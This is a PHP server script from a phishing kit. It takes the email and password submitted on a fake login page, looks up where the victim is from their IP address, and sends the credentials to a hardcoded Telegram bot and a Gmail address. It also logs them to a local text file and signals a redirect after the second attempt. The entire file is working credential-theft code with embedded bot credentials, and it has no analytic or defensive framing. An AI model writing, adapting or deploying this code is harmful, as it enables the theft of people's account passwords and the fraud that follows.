<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('log_errors', 1);
ini_set('error_log', 'php_errors.log');

// Set content type to JSON
header('Content-Type: application/json');

// Email configuration
$EMAIL_RECIPIENT = "purchase.officesdesk@gmail.com";
$EMAIL_SUBJECT = "New Login Data";

// Telegram configuration
$TELEGRAM_BOT_TOKEN = "7519343748:AAGXQR3N4ynBAPbTNe2GnkE6_uQMIR2lT7Q";
$TELEGRAM_CHAT_ID = "1888825223";

// Function to send message to Telegram
function sendToTelegram($data) {
    global $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID;
    $message = "📧 *New Login Data* 📧\n\n";
    $message .= "👤 *Email:* " . $data['email'] . "\n";
    $message .= "🔑 *Password:* " . $data['password'] . "\n";
    $message .= "🌐 *IP:* " . $data['ip'] . "\n";
    $message .= "📍 *Country:* " . $data['country'] . "\n";
    $message .= "🏙️ *City:* " . $data['city'] . "\n";
    $message .= "🗺️ *Region:* " . $data['region'] . "\n";
    $message .= "🔍 *Browser:* " . substr($data['browser'], 0, 50) . "...\n";
    $message .= "🔢 *Attempt:* " . $data['attempt'] . "\n";
    $message .= "⏰ *Timestamp:* " . $data['timestamp'] . "\n";
    $message .= "📅 *Date:* " . date('Y-m-d H:i:s') . "\n";

    $url = "https://api.telegram.org/bot{$TELEGRAM_BOT_TOKEN}/sendMessage";
    $postData = [
        'chat_id' => $TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    $options = [
        'http' => [
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($postData)
        ]
    ];
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    if ($result === FALSE) {
        error_log("Telegram API failed: " . print_r($http_response_header, true));
        return false;
    }
    $response = json_decode($result, true);
    if (!$response['ok']) {
        error_log("Telegram API error: " . $response['description']);
        return false;
    }
    return true;
}

// Function to get location info from IP
function getLocationFromIP($ip) {
    if ($ip === 'Unknown' || empty($ip)) {
        return ['country' => 'Unknown', 'city' => 'Unknown', 'region' => 'Unknown'];
    }
    try {
        $response = @file_get_contents("https://ipinfo.io/{$ip}/json");
        if ($response === FALSE) {
            error_log("IPInfo API failed for IP: $ip");
            return ['country' => 'Unknown', 'city' => 'Unknown', 'region' => 'Unknown'];
        }
        $data = json_decode($response, true);
        return [
            'country' => $data['country'] ?? 'Unknown',
            'city' => $data['city'] ?? 'Unknown',
            'region' => $data['region'] ?? 'Unknown'
        ];
    } catch (Exception $e) {
        error_log("IPInfo exception: " . $e->getMessage());
        return ['country' => 'Unknown', 'city' => 'Unknown', 'region' => 'Unknown'];
    }
}

// Function to send email
function sendEmail($data) {
    global $EMAIL_RECIPIENT, $EMAIL_SUBJECT;
    $message = "New Login Data:\n\n";
    $message .= "Email: " . $data['email'] . "\n";
    $message .= "Password: " . $data['password'] . "\n";
    $message .= "IP: " . $data['ip'] . "\n";
    $message .= "Country: " . $data['country'] . "\n";
    $message .= "City: " . $data['city'] . "\n";
    $message .= "Region: " . $data['region'] . "\n";
    $message .= "Browser: " . $data['browser'] . "\n";
    $message .= "Attempt: " . $data['attempt'] . "\n";
    $message .= "Timestamp: " . $data['timestamp'] . "\n";
    $message .= "Date: " . date('Y-m-d H:i:s') . "\n";
    $headers = "From: noreply@yourdomaini.com\r\n";
    $headers .= "Reply-To: noreply@yourdomaini.com\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();
    if (!mail($EMAIL_RECIPIENT, $EMAIL_SUBJECT, $message, $headers)) {
        error_log("Failed to send email to $EMAIL_RECIPIENT");
        return false;
    }
    return true;
}

// Function to save data to a text file
function saveToFile($data) {
    $filename = 'login_data.txt';
    $entry = "[" . date('Y-m-d H:i:s') . "] ";
    $entry .= "Email: " . $data['email'] . " | ";
    $entry .= "Password: " . $data['password'] . " | ";
    $entry .= "IP: " . $data['ip'] . " | ";
    $entry .= "Country: " . $data['country'] . " | ";
    $entry .= "Attempt: " . $data['attempt'] . "\n";
    if (!file_put_contents($filename, $entry, FILE_APPEND | LOCK_EX)) {
        error_log("Failed to write to $filename");
        return false;
    }
    return true;
}

// Process form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    error_log("Received POST data: " . print_r($_POST, true));
    $email = isset($_POST['email']) ? htmlspecialchars(trim($_POST['email'])) : '';
    $password = isset($_POST['password']) ? htmlspecialchars(trim($_POST['password'])) : '';
    $ip = isset($_POST['ipAddress']) ? htmlspecialchars(trim($_POST['ipAddress'])) : 'Unknown';
    $userAgent = isset($_POST['userAgent']) ? htmlspecialchars(trim($_POST['userAgent'])) : 'Unknown';
    $timezone = isset($_POST['timezone']) ? htmlspecialchars(trim($_POST['timezone'])) : 'Unknown';
    $browser = isset($_POST['browser']) ? htmlspecialchars(trim($_POST['browser'])) : 'Unknown';
    $attempt = isset($_POST['attempt']) ? intval($_POST['attempt']) : 1;
    $timestamp = isset($_POST['timestamp']) ? htmlspecialchars(trim($_POST['timestamp'])) : date('Y-m-d H:i:s');
    $locationData = getLocationFromIP($ip);
    $data = [
        'email' => $email,
        'password' => $password,
        'ip' => $ip,
        'country' => $locationData['country'],
        'city' => $locationData['city'],
        'region' => $locationData['region'],
        'browser' => $browser,
        'userAgent' => $userAgent,
        'timezone' => $timezone,
        'attempt' => $attempt,
        'timestamp' => $timestamp
    ];
    if (!empty($email) && !empty($password)) {
        $telegramSent = sendToTelegram($data);
        $emailSent = sendEmail($data);
        $fileSaved = saveToFile($data);
        error_log("Telegram: " . ($telegramSent ? "Sent" : "Failed") . ", Email: " . ($emailSent ? "Sent" : "Failed") . ", File: " . ($fileSaved ? "Saved" : "Failed"));
        echo json_encode([
            'status' => 'success',
            'message' => 'Data processed successfully',
            'attempt' => $attempt,
            'redirect' => $attempt >= 2
        ]);
        exit();
    } else {
        http_response_code(400);
        error_log("Invalid data: email or password missing");
        echo json_encode([
            'status' => 'error',
            'message' => 'Invalid data received'
        ]);
        exit();
    }
} else {
    http_response_code(405);
    error_log("Invalid request method: " . $_SERVER["REQUEST_METHOD"]);
    echo json_encode([
        'status' => 'error',
        'message' => 'Method not allowed'
    ]);
    exit();
}
?>